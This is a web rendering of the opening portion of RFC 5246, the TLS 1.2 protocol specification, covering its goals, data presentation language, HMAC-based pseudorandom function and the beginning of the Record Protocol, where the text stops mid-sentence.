|  | Compare versions |  | RFC 5246  draft-ietf-tls-rfc4346-bis-10  draft-ietf-tls-rfc4346-bis-09  draft-ietf-tls-rfc4346-bis-08  draft-ietf-tls-rfc4346-bis-07  draft-ietf-tls-rfc4346-bis-06  draft-ietf-tls-rfc4346-bis-05  draft-ietf-tls-rfc4346-bis-04  draft-ietf-tls-rfc4346-bis-03  draft-ietf-tls-rfc4346-bis-02  draft-ietf-tls-rfc4346-bis-01  draft-ietf-tls-rfc4346-bis-00   RFC 5246  draft-ietf-tls-rfc4346-bis-10  draft-ietf-tls-rfc4346-bis-09  draft-ietf-tls-rfc4346-bis-08  draft-ietf-tls-rfc4346-bis-07  draft-ietf-tls-rfc4346-bis-06  draft-ietf-tls-rfc4346-bis-05  draft-ietf-tls-rfc4346-bis-04  draft-ietf-tls-rfc4346-bis-03  draft-ietf-tls-rfc4346-bis-02  draft-ietf-tls-rfc4346-bis-01  draft-ietf-tls-rfc4346-bis-00   Side-by-side  Inline |
|  | Authors |  | [Eric Rescorla](/person/ekr%40rtfm.com "Datatracker profile of Eric Rescorla") , [Tim Dierks](/person/tim%40dierks.org "Datatracker profile of Tim Dierks")   Email authors |
|  | RFC stream |  | IETF Logo IETF Logo |
|  | Other formats |  | [txt](https://www.rfc-editor.org/rfc/rfc5246.txt) [html](https://www.rfc-editor.org/rfc/rfc5246.html) [pdf](https://www.rfc-editor.org/rfc/pdfrfc/rfc5246.txt.pdf) [w/errata](https://www.rfc-editor.org/rfc/inline-errata/rfc5246.html) [bibtex](/doc/rfc5246/bibtex/) |
|  | Additional resources |  | [Mailing list discussion](https://mailarchive.ietf.org/arch/browse/tls/?q=rfc5246 OR %22draft-ietf-tls-rfc4346-bis%22) |
|  |  |  | [Report a bug](https://github.com/ietf-tools/datatracker/issues/new/choose) |

```
Network Working Group                                          T. Dierks
Request for Comments: 5246                                   Independent
Obsoletes: [3268](/doc/html/rfc3268), [4346](/doc/html/rfc4346), [4366](/doc/html/rfc4366)                                  E. Rescorla
Updates: [4492](/doc/html/rfc4492)                                                 RTFM, Inc.
Category: Standards Track                                    August 2008

              The Transport Layer Security (TLS) Protocol
                              Version 1.2

Status of This Memo

   This document specifies an Internet standards track protocol for the
   Internet community, and requests discussion and suggestions for
   improvements.  Please refer to the current edition of the "Internet
   Official Protocol Standards" (STD 1) for the standardization state
   and status of this protocol.  Distribution of this memo is unlimited.

Abstract

   This document specifies Version 1.2 of the Transport Layer Security
   (TLS) protocol.  The TLS protocol provides communications security
   over the Internet.  The protocol allows client/server applications to
   communicate in a way that is designed to prevent eavesdropping,
   tampering, or message forgery.

Table of Contents

   [1](#section-1). Introduction ....................................................[4](#page-4)
      [1.1](#section-1.1). Requirements Terminology ...................................[5](#page-5)
      [1.2](#section-1.2). Major Differences from TLS 1.1 .............................[5](#page-5)
   [2](#section-2). Goals ...........................................................[6](#page-6)
   [3](#section-3). Goals of This Document ..........................................[7](#page-7)
   [4](#section-4). Presentation Language ...........................................[7](#page-7)
      [4.1](#section-4.1). Basic Block Size ...........................................[7](#page-7)
      [4.2](#section-4.2). Miscellaneous ..............................................[8](#page-8)
      [4.3](#section-4.3). Vectors ....................................................[8](#page-8)
      [4.4](#section-4.4). Numbers ....................................................[9](#page-9)
      [4.5](#section-4.5). Enumerateds ................................................[9](#page-9)
      [4.6](#section-4.6). Constructed Types .........................................[10](#page-10)
           [4.6.1](#section-4.6.1). Variants ...........................................[10](#page-10)
      [4.7](#section-4.7). Cryptographic Attributes ..................................[12](#page-12)
      [4.8](#section-4.8). Constants .................................................[14](#page-14)
   [5](#section-5). HMAC and the Pseudorandom Function .............................[14](#page-14)
   [6](#section-6). The TLS Record Protocol ........................................[15](#page-15)
      [6.1](#section-6.1). Connection States .........................................[16](#page-16)
      [6.2](#section-6.2). Record Layer ..............................................[19](#page-19)
           [6.2.1](#section-6.2.1). Fragmentation ......................................[19](#page-19)

Dierks & Rescorla           Standards Track                     [Page 1]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

           [6.2.2](#section-6.2.2). Record Compression and Decompression ...............[20](#page-20)
           [6.2.3](#section-6.2.3). Record Payload Protection ..........................[21](#page-21)
                  [6.2.3.1](#section-6.2.3.1). Null or Standard Stream Cipher ............[22](#page-22)
                  [6.2.3.2](#section-6.2.3.2). CBC Block Cipher ..........................[22](#page-22)
                  [6.2.3.3](#section-6.2.3.3). AEAD Ciphers ..............................[24](#page-24)
      [6.3](#section-6.3). Key Calculation ...........................................[25](#page-25)
   [7](#section-7). The TLS Handshaking Protocols ..................................[26](#page-26)
      [7.1](#section-7.1). Change Cipher Spec Protocol ...............................[27](#page-27)
      [7.2](#section-7.2). Alert Protocol ............................................[28](#page-28)
           [7.2.1](#section-7.2.1). Closure Alerts .....................................[29](#page-29)
           [7.2.2](#section-7.2.2). Error Alerts .......................................[30](#page-30)
      [7.3](#section-7.3). Handshake Protocol Overview ...............................[33](#page-33)
      [7.4](#section-7.4). Handshake Protocol ........................................[37](#page-37)
           [7.4.1](#section-7.4.1). Hello Messages .....................................[38](#page-38)
                  [7.4.1.1](#section-7.4.1.1). Hello Request .............................[38](#page-38)
                  [7.4.1.2](#section-7.4.1.2). Client Hello ..............................[39](#page-39)
                  [7.4.1.3](#section-7.4.1.3). Server Hello ..............................[42](#page-42)
                  [7.4.1.4](#section-7.4.1.4). Hello Extensions ..........................[44](#page-44)
                           [7.4.1.4.1](#section-7.4.1.4.1). Signature Algorithms ...........[45](#page-45)
           [7.4.2](#section-7.4.2). Server Certificate .................................[47](#page-47)
           [7.4.3](#section-7.4.3). Server Key Exchange Message ........................[50](#page-50)
           [7.4.4](#section-7.4.4). Certificate Request ................................[53](#page-53)
           [7.4.5](#section-7.4.5). Server Hello Done ..................................[55](#page-55)
           [7.4.6](#section-7.4.6). Client Certificate .................................[55](#page-55)
           [7.4.7](#section-7.4.7). Client Key Exchange Message ........................[57](#page-57)
                  [7.4.7.1](#section-7.4.7.1). RSA-Encrypted Premaster Secret Message ....[58](#page-58)
                  [7.4.7.2](#section-7.4.7.2). Client Diffie-Hellman Public Value ........[61](#page-61)
           [7.4.8](#section-7.4.8). Certificate Verify .................................[62](#page-62)
           [7.4.9](#section-7.4.9). Finished ...........................................[63](#page-63)
   [8](#section-8). Cryptographic Computations .....................................[64](#page-64)
      [8.1](#section-8.1). Computing the Master Secret ...............................[64](#page-64)
           [8.1.1](#section-8.1.1). RSA ................................................[65](#page-65)
           [8.1.2](#section-8.1.2). Diffie-Hellman .....................................[65](#page-65)
   [9](#section-9). Mandatory Cipher Suites ........................................[65](#page-65)
   [10](#section-10). Application Data Protocol .....................................[65](#page-65)
   [11](#section-11). Security Considerations .......................................[65](#page-65)
   [12](#section-12). IANA Considerations ...........................................[65](#page-65)
   [Appendix A](#appendix-A). Protocol Data Structures and Constant Values ..........[68](#page-68)
      [A.1](#appendix-A.1). Record Layer ..............................................[68](#page-68)
      [A.2](#appendix-A.2). Change Cipher Specs Message ...............................[69](#page-69)
      [A.3](#appendix-A.3). Alert Messages ............................................[69](#page-69)
      [A.4](#appendix-A.4). Handshake Protocol ........................................[70](#page-70)
           [A.4.1](#appendix-A.4.1). Hello Messages .....................................[71](#page-71)
           [A.4.2](#appendix-A.4.2). Server Authentication and Key Exchange Messages ....[72](#page-72)
           [A.4.3](#appendix-A.4.3). Client Authentication and Key Exchange Messages ....[74](#page-74)
           [A.4.4](#appendix-A.4.4). Handshake Finalization Message .....................[74](#page-74)
      [A.5](#appendix-A.5). The Cipher Suite ..........................................[75](#page-75)
      [A.6](#appendix-A.6). The Security Parameters ...................................[77](#page-77)

Dierks & Rescorla           Standards Track                     [Page 2]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      [A.7](#appendix-A.7). Changes to [RFC 4492](/doc/html/rfc4492) .......................................[78](#page-78)
   [Appendix B](#appendix-B). Glossary ..............................................[78](#page-78)
   [Appendix C](#appendix-C). Cipher Suite Definitions ..............................[83](#page-83)
   [Appendix D](#appendix-D). Implementation Notes ..................................[85](#page-85)
      [D.1](#appendix-D.1). Random Number Generation and Seeding ......................[85](#page-85)
      [D.2](#appendix-D.2). Certificates and Authentication ...........................[85](#page-85)
      [D.3](#appendix-D.3). Cipher Suites .............................................[85](#page-85)
      [D.4](#appendix-D.4). Implementation Pitfalls ...................................[85](#page-85)
   [Appendix E](#appendix-E). Backward Compatibility ................................[87](#page-87)
      [E.1](#appendix-E.1). Compatibility with TLS 1.0/1.1 and SSL 3.0 ................[87](#page-87)
      [E.2](#appendix-E.2). Compatibility with SSL 2.0 ................................[88](#page-88)
      [E.3](#appendix-E.3). Avoiding Man-in-the-Middle Version Rollback ...............[90](#page-90)
   [Appendix F](#appendix-F). Security Analysis .....................................[91](#page-91)
      [F.1](#appendix-F.1). Handshake Protocol ........................................[91](#page-91)
           [F.1.1](#appendix-F.1.1). Authentication and Key Exchange ....................[91](#page-91)
                  [F.1.1.1](#appendix-F.1.1.1). Anonymous Key Exchange ....................[91](#page-91)
                  [F.1.1.2](#appendix-F.1.1.2). RSA Key Exchange and Authentication .......[92](#page-92)
                  F.1.1.3. Diffie-Hellman Key Exchange with
                           Authentication ............................[92](#page-92)
           [F.1.2](#appendix-F.1.2). Version Rollback Attacks ...........................[93](#page-93)
           [F.1.3](#appendix-F.1.3). Detecting Attacks Against the Handshake Protocol ...[94](#page-94)
           [F.1.4](#appendix-F.1.4). Resuming Sessions ..................................[94](#page-94)
      [F.2](#appendix-F.2). Protecting Application Data ...............................[94](#page-94)
      [F.3](#appendix-F.3). Explicit IVs ..............................................[95](#page-95)
      [F.4](#appendix-F.4). Security of Composite Cipher Modes ........................[95](#page-95)
      [F.5](#appendix-F.5). Denial of Service .........................................[96](#page-96)
      [F.6](#appendix-F.6). Final Notes ...............................................[96](#page-96)
   Normative References ..............................................[97](#page-97)
   Informative References ............................................[98](#page-98)
   Working Group Information ........................................[101](#page-101)
   Contributors .....................................................[101](#page-101)

Dierks & Rescorla           Standards Track                     [Page 3]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[1](#section-1).  Introduction

   The primary goal of the TLS protocol is to provide privacy and data
   integrity between two communicating applications.  The protocol is
   composed of two layers: the TLS Record Protocol and the TLS Handshake
   Protocol.  At the lowest level, layered on top of some reliable
   transport protocol (e.g., TCP [[TCP](#ref-TCP)]), is the TLS Record Protocol.
   The TLS Record Protocol provides connection security that has two
   basic properties:

   -  The connection is private.  Symmetric cryptography is used for
      data encryption (e.g., AES [[AES](#ref-AES)], RC4 [[SCH](#ref-SCH)], etc.).  The keys for
      this symmetric encryption are generated uniquely for each
      connection and are based on a secret negotiated by another
      protocol (such as the TLS Handshake Protocol).  The Record
      Protocol can also be used without encryption.

   -  The connection is reliable.  Message transport includes a message
      integrity check using a keyed MAC.  Secure hash functions (e.g.,
      SHA-1, etc.) are used for MAC computations.  The Record Protocol
      can operate without a MAC, but is generally only used in this mode
      while another protocol is using the Record Protocol as a transport
      for negotiating security parameters.

   The TLS Record Protocol is used for encapsulation of various higher-
   level protocols.  One such encapsulated protocol, the TLS Handshake
   Protocol, allows the server and client to authenticate each other and
   to negotiate an encryption algorithm and cryptographic keys before
   the application protocol transmits or receives its first byte of
   data.  The TLS Handshake Protocol provides connection security that
   has three basic properties:

   -  The peer's identity can be authenticated using asymmetric, or
      public key, cryptography (e.g., RSA [[RSA](#ref-RSA)], DSA [[DSS](#ref-DSS)], etc.).  This
      authentication can be made optional, but is generally required for
      at least one of the peers.

   -  The negotiation of a shared secret is secure: the negotiated
      secret is unavailable to eavesdroppers, and for any authenticated
      connection the secret cannot be obtained, even by an attacker who
      can place himself in the middle of the connection.

   -  The negotiation is reliable: no attacker can modify the
      negotiation communication without being detected by the parties to
      the communication.

Dierks & Rescorla           Standards Track                     [Page 4]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   One advantage of TLS is that it is application protocol independent.
   Higher-level protocols can layer on top of the TLS protocol
   transparently.  The TLS standard, however, does not specify how
   protocols add security with TLS; the decisions on how to initiate TLS
   handshaking and how to interpret the authentication certificates
   exchanged are left to the judgment of the designers and implementors
   of protocols that run on top of TLS.

[1.1](#section-1.1).  Requirements Terminology

   The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT",
   "SHOULD", "SHOULD NOT", "RECOMMENDED", "MAY", and "OPTIONAL" in this
   document are to be interpreted as described in [RFC 2119](/doc/html/rfc2119) [[REQ](#ref-REQ)].

[1.2](#section-1.2).  Major Differences from TLS 1.1

   This document is a revision of the TLS 1.1 [[TLS1.1](#ref-TLS1.1)] protocol which
   contains improved flexibility, particularly for negotiation of
   cryptographic algorithms.  The major changes are:

   -  The MD5/SHA-1 combination in the pseudorandom function (PRF) has
      been replaced with cipher-suite-specified PRFs.  All cipher suites
      in this document use P_SHA256.

   -  The MD5/SHA-1 combination in the digitally-signed element has been
      replaced with a single hash.  Signed elements now include a field
      that explicitly specifies the hash algorithm used.

   -  Substantial cleanup to the client's and server's ability to
      specify which hash and signature algorithms they will accept.
      Note that this also relaxes some of the constraints on signature
      and hash algorithms from previous versions of TLS.

   -  Addition of support for authenticated encryption with additional
      data modes.

   -  TLS Extensions definition and AES Cipher Suites were merged in
      from external [[TLSEXT](#ref-TLSEXT)] and [[TLSAES](#ref-TLSAES)].

   -  Tighter checking of EncryptedPreMasterSecret version numbers.

   -  Tightened up a number of requirements.

   -  Verify_data length now depends on the cipher suite (default is
      still 12).

   -  Cleaned up description of Bleichenbacher/Klima attack defenses.

Dierks & Rescorla           Standards Track                     [Page 5]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   -  Alerts MUST now be sent in many cases.

   -  After a certificate_request, if no certificates are available,
      clients now MUST send an empty certificate list.

   -  TLS_RSA_WITH_AES_128_CBC_SHA is now the mandatory to implement
      cipher suite.

   -  Added HMAC-SHA256 cipher suites.

   -  Removed IDEA and DES cipher suites.  They are now deprecated and
      will be documented in a separate document.

   -  Support for the SSLv2 backward-compatible hello is now a MAY, not
      a SHOULD, with sending it a SHOULD NOT.  Support will probably
      become a SHOULD NOT in the future.

   -  Added limited "fall-through" to the presentation language to allow
      multiple case arms to have the same encoding.

   -  Added an Implementation Pitfalls sections

   -  The usual clarifications and editorial work.

[2](#section-2).  Goals

   The goals of the TLS protocol, in order of priority, are as follows:

   1. Cryptographic security: TLS should be used to establish a secure
      connection between two parties.

   2. Interoperability: Independent programmers should be able to
      develop applications utilizing TLS that can successfully exchange
      cryptographic parameters without knowledge of one another's code.

   3. Extensibility: TLS seeks to provide a framework into which new
      public key and bulk encryption methods can be incorporated as
      necessary.  This will also accomplish two sub-goals: preventing
      the need to create a new protocol (and risking the introduction of
      possible new weaknesses) and avoiding the need to implement an
      entire new security library.

   4. Relative efficiency: Cryptographic operations tend to be highly
      CPU intensive, particularly public key operations.  For this
      reason, the TLS protocol has incorporated an optional session
      caching scheme to reduce the number of connections that need to be
      established from scratch.  Additionally, care has been taken to
      reduce network activity.

Dierks & Rescorla           Standards Track                     [Page 6]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[3](#section-3).  Goals of This Document

   This document and the TLS protocol itself are based on the SSL 3.0
   Protocol Specification as published by Netscape.  The differences
   between this protocol and SSL 3.0 are not dramatic, but they are
   significant enough that the various versions of TLS and SSL 3.0 do
   not interoperate (although each protocol incorporates a mechanism by
   which an implementation can back down to prior versions).  This
   document is intended primarily for readers who will be implementing
   the protocol and for those doing cryptographic analysis of it.  The
   specification has been written with this in mind, and it is intended
   to reflect the needs of those two groups.  For that reason, many of
   the algorithm-dependent data structures and rules are included in the
   body of the text (as opposed to in an appendix), providing easier
   access to them.

   This document is not intended to supply any details of service
   definition or of interface definition, although it does cover select
   areas of policy as they are required for the maintenance of solid
   security.

[4](#section-4).  Presentation Language

   This document deals with the formatting of data in an external
   representation.  The following very basic and somewhat casually
   defined presentation syntax will be used.  The syntax draws from
   several sources in its structure.  Although it resembles the
   programming language "C" in its syntax and XDR [[XDR](#ref-XDR)] in both its
   syntax and intent, it would be risky to draw too many parallels.  The
   purpose of this presentation language is to document TLS only; it has
   no general application beyond that particular goal.

[4.1](#section-4.1).  Basic Block Size

   The representation of all data items is explicitly specified.  The
   basic data block size is one byte (i.e., 8 bits).  Multiple byte data
   items are concatenations of bytes, from left to right, from top to
   bottom.  From the byte stream, a multi-byte item (a numeric in the
   example) is formed (using C notation) by:

      value = (byte[0] << 8*(n-1)) | (byte[1] << 8*(n-2)) |
              ... | byte[n-1];

   This byte ordering for multi-byte values is the commonplace network
   byte order or big-endian format.

Dierks & Rescorla           Standards Track                     [Page 7]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[4.2](#section-4.2).  Miscellaneous

   Comments begin with "/*" and end with "*/".

   Optional components are denoted by enclosing them in "[[ ]]" double
   brackets.

   Single-byte entities containing uninterpreted data are of type
   opaque.

[4.3](#section-4.3).  Vectors

   A vector (single-dimensioned array) is a stream of homogeneous data
   elements.  The size of the vector may be specified at documentation
   time or left unspecified until runtime.  In either case, the length
   declares the number of bytes, not the number of elements, in the
   vector.  The syntax for specifying a new type, T', that is a fixed-
   length vector of type T is

      T T'[n];

   Here, T' occupies n bytes in the data stream, where n is a multiple
   of the size of T.  The length of the vector is not included in the
   encoded stream.

   In the following example, Datum is defined to be three consecutive
   bytes that the protocol does not interpret, while Data is three
   consecutive Datum, consuming a total of nine bytes.

      opaque Datum[3];      /* three uninterpreted bytes */
      Datum Data[9];        /* 3 consecutive 3 byte vectors */

   Variable-length vectors are defined by specifying a subrange of legal
   lengths, inclusively, using the notation <floor..ceiling>.  When
   these are encoded, the actual length precedes the vector's contents
   in the byte stream.  The length will be in the form of a number
   consuming as many bytes as required to hold the vector's specified
   maximum (ceiling) length.  A variable-length vector with an actual
   length field of zero is referred to as an empty vector.

      T T'<floor..ceiling>;

   In the following example, mandatory is a vector that must contain
   between 300 and 400 bytes of type opaque.  It can never be empty.
   The actual length field consumes two bytes, a uint16, which is
   sufficient to represent the value 400 (see [Section 4.4](#section-4.4)).  On the
   other hand, longer can represent up to 800 bytes of data, or 400
   uint16 elements, and it may be empty.  Its encoding will include a

Dierks & Rescorla           Standards Track                     [Page 8]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   two-byte actual length field prepended to the vector.  The length of
   an encoded vector must be an even multiple of the length of a single
   element (for example, a 17-byte vector of uint16 would be illegal).

      opaque mandatory<300..400>;
            /* length field is 2 bytes, cannot be empty */
      uint16 longer<0..800>;
            /* zero to 400 16-bit unsigned integers */

[4.4](#section-4.4).  Numbers

   The basic numeric data type is an unsigned byte (uint8).  All larger
   numeric data types are formed from fixed-length series of bytes
   concatenated as described in [Section 4.1](#section-4.1) and are also unsigned.  The
   following numeric types are predefined.

      uint8 uint16[2];
      uint8 uint24[3];
      uint8 uint32[4];
      uint8 uint64[8];

   All values, here and elsewhere in the specification, are stored in
   network byte (big-endian) order; the uint32 represented by the hex
   bytes 01 02 03 04 is equivalent to the decimal value 16909060.

   Note that in some cases (e.g., DH parameters) it is necessary to
   represent integers as opaque vectors.  In such cases, they are
   represented as unsigned integers (i.e., leading zero octets are not
   required even if the most significant bit is set).

[4.5](#section-4.5).  Enumerateds

   An additional sparse data type is available called enum.  A field of
   type enum can only assume the values declared in the definition.
   Each definition is a different type.  Only enumerateds of the same
   type may be assigned or compared.  Every element of an enumerated
   must be assigned a value, as demonstrated in the following example.
   Since the elements of the enumerated are not ordered, they can be
   assigned any unique value, in any order.

      enum { e1(v1), e2(v2), ... , en(vn) [[, (n)]] } Te;

   An enumerated occupies as much space in the byte stream as would its
   maximal defined ordinal value.  The following definition would cause
   one byte to be used to carry fields of type Color.

      enum { red(3), blue(5), white(7) } Color;

Dierks & Rescorla           Standards Track                     [Page 9]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   One may optionally specify a value without its associated tag to
   force the width definition without defining a superfluous element.

   In the following example, Taste will consume two bytes in the data
   stream but can only assume the values 1, 2, or 4.

      enum { sweet(1), sour(2), bitter(4), (32000) } Taste;

   The names of the elements of an enumeration are scoped within the
   defined type.  In the first example, a fully qualified reference to
   the second element of the enumeration would be Color.blue.  Such
   qualification is not required if the target of the assignment is well
   specified.

      Color color = Color.blue;     /* overspecified, legal */
      Color color = blue;           /* correct, type implicit */

   For enumerateds that are never converted to external representation,
   the numerical information may be omitted.

      enum { low, medium, high } Amount;

[4.6](#section-4.6).  Constructed Types

   Structure types may be constructed from primitive types for
   convenience.  Each specification declares a new, unique type.  The
   syntax for definition is much like that of C.

      struct {
          T1 f1;
          T2 f2;
          ...
          Tn fn;
      } [[T]];

   The fields within a structure may be qualified using the type's name,
   with a syntax much like that available for enumerateds.  For example,
   T.f2 refers to the second field of the previous declaration.
   Structure definitions may be embedded.

[4.6.1](#section-4.6.1).  Variants

   Defined structures may have variants based on some knowledge that is
   available within the environment.  The selector must be an enumerated
   type that defines the possible variants the structure defines.  There
   must be a case arm for every element of the enumeration declared in
   the select.  Case arms have limited fall-through: if two case arms
   follow in immediate succession with no fields in between, then they

Dierks & Rescorla           Standards Track                    [Page 10]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   both contain the same fields.  Thus, in the example below, "orange"
   and "banana" both contain V2.  Note that this is a new piece of
   syntax in TLS 1.2.

   The body of the variant structure may be given a label for reference.
   The mechanism by which the variant is selected at runtime is not
   prescribed by the presentation language.

      struct {
          T1 f1;
          T2 f2;
          ....
          Tn fn;
           select (E) {
               case e1: Te1;
               case e2: Te2;
               case e3: case e4: Te3;
               ....
               case en: Ten;
           } [[fv]];
      } [[Tv]];

   For example:

      enum { apple, orange, banana } VariantTag;

      struct {
          uint16 number;
          opaque string<0..10>; /* variable length */
      } V1;

      struct {
          uint32 number;
          opaque string[10];    /* fixed length */
      } V2;

      struct {
          select (VariantTag) { /* value of selector is implicit */
              case apple:
                V1;   /* VariantBody, tag = apple */
              case orange:
              case banana:
                V2;   /* VariantBody, tag = orange or banana */
          } variant_body;       /* optional label on variant */
      } VariantRecord;

Dierks & Rescorla           Standards Track                    [Page 11]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[4.7](#section-4.7).  Cryptographic Attributes

   The five cryptographic operations -- digital signing, stream cipher
   encryption, block cipher encryption, authenticated encryption with
   additional data (AEAD) encryption, and public key encryption -- are
   designated digitally-signed, stream-ciphered, block-ciphered, aead-
   ciphered, and public-key-encrypted, respectively.  A field's
   cryptographic processing is specified by prepending an appropriate
   key word designation before the field's type specification.
   Cryptographic keys are implied by the current session state (see
   [Section 6.1](#section-6.1)).

   A digitally-signed element is encoded as a struct DigitallySigned:

      struct {
         SignatureAndHashAlgorithm algorithm;
         opaque signature<0..2^16-1>;
      } DigitallySigned;

   The algorithm field specifies the algorithm used (see [Section](#section-7.4.1.4.1)
   [7.4.1.4.1](#section-7.4.1.4.1) for the definition of this field).  Note that the
   introduction of the algorithm field is a change from previous
   versions.  The signature is a digital signature using those
   algorithms over the contents of the element.  The contents themselves
   do not appear on the wire but are simply calculated.  The length of
   the signature is specified by the signing algorithm and key.

   In RSA signing, the opaque vector contains the signature generated
   using the RSASSA-PKCS1-v1_5 signature scheme defined in [[PKCS1](#ref-PKCS1)].  As
   discussed in [[PKCS1](#ref-PKCS1)], the DigestInfo MUST be DER-encoded [[X680](#ref-X680)]
   [[X690](#ref-X690)].  For hash algorithms without parameters (which includes
   SHA-1), the DigestInfo.AlgorithmIdentifier.parameters field MUST be
   NULL, but implementations MUST accept both without parameters and
   with NULL parameters.  Note that earlier versions of TLS used a
   different RSA signature scheme that did not include a DigestInfo
   encoding.

   In DSA, the 20 bytes of the SHA-1 hash are run directly through the
   Digital Signing Algorithm with no additional hashing.  This produces
   two values, r and s.  The DSA signature is an opaque vector, as
   above, the contents of which are the DER encoding of:

      Dss-Sig-Value ::= SEQUENCE {
          r INTEGER,
          s INTEGER
      }

Dierks & Rescorla           Standards Track                    [Page 12]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   Note: In current terminology, DSA refers to the Digital Signature
   Algorithm and DSS refers to the NIST standard.  In the original SSL
   and TLS specs, "DSS" was used universally.  This document uses "DSA"
   to refer to the algorithm, "DSS" to refer to the standard, and it
   uses "DSS" in the code point definitions for historical continuity.

   In stream cipher encryption, the plaintext is exclusive-ORed with an
   identical amount of output generated from a cryptographically secure
   keyed pseudorandom number generator.

   In block cipher encryption, every block of plaintext encrypts to a
   block of ciphertext.  All block cipher encryption is done in CBC
   (Cipher Block Chaining) mode, and all items that are block-ciphered
   will be an exact multiple of the cipher block length.

   In AEAD encryption, the plaintext is simultaneously encrypted and
   integrity protected.  The input may be of any length, and aead-
   ciphered output is generally larger than the input in order to
   accommodate the integrity check value.

   In public key encryption, a public key algorithm is used to encrypt
   data in such a way that it can be decrypted only with the matching
   private key.  A public-key-encrypted element is encoded as an opaque
   vector <0..2^16-1>, where the length is specified by the encryption
   algorithm and key.

   RSA encryption is done using the RSAES-PKCS1-v1_5 encryption scheme
   defined in [[PKCS1](#ref-PKCS1)].

   In the following example

      stream-ciphered struct {
          uint8 field1;
          uint8 field2;
          digitally-signed opaque {
            uint8 field3<0..255>;
            uint8 field4;
          };
      } UserType;

   The contents of the inner struct (field3 and field4) are used as
   input for the signature/hash algorithm, and then the entire structure
   is encrypted with a stream cipher.  The length of this structure, in
   bytes, would be equal to two bytes for field1 and field2, plus two
   bytes for the signature and hash algorithm, plus two bytes for the
   length of the signature, plus the length of the output of the signing

Dierks & Rescorla           Standards Track                    [Page 13]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   algorithm.  The length of the signature is known because the
   algorithm and key used for the signing are known prior to encoding or
   decoding this structure.

[4.8](#section-4.8).  Constants

   Typed constants can be defined for purposes of specification by
   declaring a symbol of the desired type and assigning values to it.

   Under-specified types (opaque, variable-length vectors, and
   structures that contain opaque) cannot be assigned values.  No fields
   of a multi-element structure or vector may be elided.

   For example:

      struct {
          uint8 f1;
          uint8 f2;
      } Example1;

      Example1 ex1 = {1, 4};  /* assigns f1 = 1, f2 = 4 */

[5](#section-5).  HMAC and the Pseudorandom Function

   The TLS record layer uses a keyed Message Authentication Code (MAC)
   to protect message integrity.  The cipher suites defined in this
   document use a construction known as HMAC, described in [[HMAC](#ref-HMAC)], which
   is based on a hash function.  Other cipher suites MAY define their
   own MAC constructions, if needed.

   In addition, a construction is required to do expansion of secrets
   into blocks of data for the purposes of key generation or validation.
   This pseudorandom function (PRF) takes as input a secret, a seed, and
   an identifying label and produces an output of arbitrary length.

   In this section, we define one PRF, based on HMAC.  This PRF with the
   SHA-256 hash function is used for all cipher suites defined in this
   document and in TLS documents published prior to this document when
   TLS 1.2 is negotiated.  New cipher suites MUST explicitly specify a
   PRF and, in general, SHOULD use the TLS PRF with SHA-256 or a
   stronger standard hash function.

   First, we define a data expansion function, P_hash(secret, data),
   that uses a single hash function to expand a secret and seed into an
   arbitrary quantity of output:

Dierks & Rescorla           Standards Track                    [Page 14]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      P_hash(secret, seed) = HMAC_hash(secret, A(1) + seed) +
                             HMAC_hash(secret, A(2) + seed) +
                             HMAC_hash(secret, A(3) + seed) + ...

   where + indicates concatenation.

   A() is defined as:

      A(0) = seed
      A(i) = HMAC_hash(secret, A(i-1))

   P_hash can be iterated as many times as necessary to produce the
   required quantity of data.  For example, if P_SHA256 is being used to
   create 80 bytes of data, it will have to be iterated three times
   (through A(3)), creating 96 bytes of output data; the last 16 bytes
   of the final iteration will then be discarded, leaving 80 bytes of
   output data.

   TLS's PRF is created by applying P_hash to the secret as:

      PRF(secret, label, seed) = P_<hash>(secret, label + seed)

   The label is an ASCII string.  It should be included in the exact
   form it is given without a length byte or trailing null character.
   For example, the label "slithy toves" would be processed by hashing
   the following bytes:

      73 6C 69 74 68 79 20 74 6F 76 65 73

[6](#section-6).  The TLS Record Protocol

   The TLS Record Protocol is a layered protocol.  At each layer,
   messages may include fields for length, description, and content.
   The Record Protocol takes messages to be transmitted, fragments the
   data into manageable blocks, optionally compresses the data, applies
   a MAC, encrypts, and transmits the result.  Received data is
   decrypted, verified, decompressed, reassembled, and then delivered to
   higher-level clients.

   Four protocols that use the record protocol are described in this
   document: the handshake protocol, the alert protocol, the change
   cipher spec protocol, and the application data protocol.  In order to
   allow extension of the TLS protocol, additional record content types
   can be supported by the record protocol.  New record content type
   values are assigned by IANA in the TLS Content Type Registry as
   described in [Section 12](#section-12).

Dierks & Rescorla           Standards Track                    [Page 15]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   Implementations MUST NOT send record types not defined in this
   document unless negotiated by some extension.  If a TLS
   implementation receives an unexpected record type, it MUST send an
   unexpected_message alert.

   Any protocol designed for use over TLS must be carefully designed to
   deal with all possible attacks against it.  As a practical matter,
   this means that the protocol designer must be aware of what security
   properties TLS does and does not provide and cannot safely rely on
   the latter.

   Note in particular that type and length of a record are not protected
   by encryption.  If this information is itself sensitive, application
   designers may wish to take steps (padding, cover traffic) to minimize
   information leakage.

[6.1](#section-6.1).  Connection States

   A TLS connection state is the operating environment of the TLS Record
   Protocol.  It specifies a compression algorithm, an encryption
   algorithm, and a MAC algorithm.  In addition, the parameters for
   these algorithms are known: the MAC key and the bulk encryption keys
   for the connection in both the read and the write directions.
   Logically, there are always four connection states outstanding: the
   current read and write states, and the pending read and write states.
   All records are processed under the current read and write states.
   The security parameters for the pending states can be set by the TLS
   Handshake Protocol, and the ChangeCipherSpec can selectively make
